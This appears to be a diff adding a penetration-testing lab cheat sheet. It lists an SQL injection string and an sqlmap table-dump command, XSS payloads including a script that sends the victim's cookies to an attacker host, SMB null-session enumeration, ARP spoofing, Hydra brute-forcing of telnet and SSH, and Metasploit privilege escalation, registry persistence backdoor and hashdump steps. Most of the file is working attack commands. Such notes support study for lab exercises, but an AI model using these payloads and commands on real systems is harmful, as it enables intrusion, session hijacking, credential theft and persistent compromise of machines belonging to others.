@@ -1,0 +1,106 @@
+' or 1=1; -- -
+sqlmap -u http://10.124.211.96/newsdetails.php?id=1 -D awd -T accounts --dump
+
+
+XSS:
+<h1> Test XSS </h1>
+
+Let us now check if javascript code can be injected too. To do this let us use the following
+payload: <script> alert('XSS') </script>
+
+Note that we have created this page for your
+convenience and that in a real situation you’d need to have this page on your server.
+
+<script>
+var i = new Image();
+i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
+</script>
+
+After we insert the previous payload, we just have to wait few minutes until the admin
+opens the contacts page. The script will run and steal the cookies.
+
+Once the script runs on the admin machine, we should be able to see the stolen cookies in
+the jar.txt file hosted on http://192.168.99.11/jar.txt (You can open this url from your web
+browser).	
+
+
+NULL SESSION
+
+ifconfig
+run 
+nmap on IP Range use -sn
+enum4linux -n IP (This whill check for Null Session)
+enum4linux -a IP (Exploit)
+
+	Get the list of shares using smbclie
+smbclient -L WORKGROUP  -I IP -N -U "" 
+smbclient \\\\IP\\WOrkSharing -N
+get Congratulations.txt /root/Desktop/Congratulations.txt
+exit
+cat file
+<>
+
+
+ARP Poisioning: 
+# nmap -sS -n 10.100.13.0-140,141-255
+echo 1 > /proc/sys/net/ipv4/ip_forward (Intercept)
+
+ arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
+
+Wireshark
+
+filter telnet 
+
+
+BRUTEFORCE PASSWORD CRACKING: 
+ifconfig
+nmap -sn IP RANGE
+
+Let us target the host found in the previous step and check what ports 
+are open and services it hasrunning
+nmap -sV IP (port scan)
+
+It is time to get our hands dirty! Let us try to bruteforce both telnet and SSH in order to find any working pair of username and password. To do this we are going to use 
+Hydra. For the telnet service, let us use the following command and see what we get: 
+
+hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt telnet://192.168.99.22
+
+telnet IP -l sysadmin
+
+
+hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt 192.168.99.22 ssh
+
+
+METASPLOIT:
+nmap -sn IP Range
+nmap -sV IP 
+search freeftp  
+use <>
+show options
+set RHOST
+exploit 
+meterpreter> sysinfo 
+getuid
+getsystem
+getuid
+
+background
+persistence
+
+
+set the STARTUP parameter to SYSTEM 
+set  the name of the windows registries to "backdoor". 
+
+exploit
+background
+session -i 10
+hashdump
+
+
+Once we have the hashes we can just store it locally into a file and use John the Ripper 
+to  crack them
+
+
+Search -f Congrats.txt
+
+
